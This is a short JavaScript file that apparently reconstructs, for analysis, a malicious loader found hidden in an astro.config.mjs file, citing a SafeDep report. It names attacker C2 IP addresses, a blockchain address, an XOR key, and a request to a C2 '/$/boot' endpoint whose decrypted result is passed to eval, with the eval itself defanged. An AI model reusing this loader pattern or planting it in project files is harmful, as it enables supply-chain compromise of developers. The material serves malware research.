// Inert static reconstruction from SafeDep's astro.config.mjs blockchain C2 report.
// Source: https://safedep.io/astro-config-blockchain-c2-supply-chain/
const require_ = global.r;

(async function stageB_boot() {
  const marker = global._V || 0;
  if (marker[0] === "A") {
    global._H2 = "http://166.88.54.158";
  } else if (!isNaN(parseInt(marker))) {
    global._H2 = "http://198.105.127.210";
  } else {
    global._H = "http://198.105.127.210";
    global._H2 = "http://23.27.202.27:27017";
  }

  global._t_1 = "TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP";
  global._t_2 = "0xbe037400670fbf1c32364f762975908dc43eeb38759263e7dfcdabc76380811e";

  const xorDecrypt = (cipher) => {
    const key = "ThZG+0jfXE6VAGOJ";
    let out = "";
    for (let i = 0; i < cipher.length; i++) {
      out += String.fromCharCode(cipher.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    return out;
  };

  const encryptedClient = await new Promise((resolve, reject) => {
    const url = new URL((global._H || global._H2) + "/$/boot");
    const req = require_("http").request({
      method: "GET",
      hostname: url.hostname,
      port: url.port,
      path: url.pathname,
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0.0.0 Safari/537.36",
        "Sec-V": marker,
      },
    }, (res) => {
      let body = "";
      res.on("data", (c) => (body += c));
      res.on("end", () => resolve(body));
    });
    req.on("error", reject);
    req.end();
  });

  eval(xorDecrypt("local arithmetic"));
})();

